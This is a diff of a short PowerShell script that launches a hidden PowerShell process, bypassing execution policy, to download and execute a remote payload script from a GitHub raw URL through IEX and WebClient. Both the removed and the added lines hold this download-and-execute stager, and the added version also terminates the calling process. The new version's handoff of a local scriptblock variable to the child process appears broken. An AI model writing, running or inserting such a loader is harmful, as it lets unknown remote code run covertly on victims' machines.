@@ -1,11 +1,9 @@
-# Get the current PowerShell process
-$currentProcess = Get-Process -Id $PID
+# Create a new PowerShell process
+$command = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1');"
+$scriptblock = [scriptblock]::Create($command)
 
-# Start a new hidden PowerShell process
-$newProcess = Start-Process powershell -ArgumentList @('-NoProfile', '-ExecutionPolicy Bypass', '-Command', 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1'')') -WindowStyle Hidden
+# Start a new hidden PowerShell process with the specified command
+Start-Process -FilePath PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `$ExecutionContext.InvokeCommand.Invoke($scriptblock)" -WindowStyle Hidden -PassThru
 
-# Wait for the new process to finish
-$newProcess.WaitForExit()
-
-# Close the old PowerShell process
-Stop-Process -Id $currentProcess.Id
+# Close the current PowerShell process
+Stop-Process -Id $PID
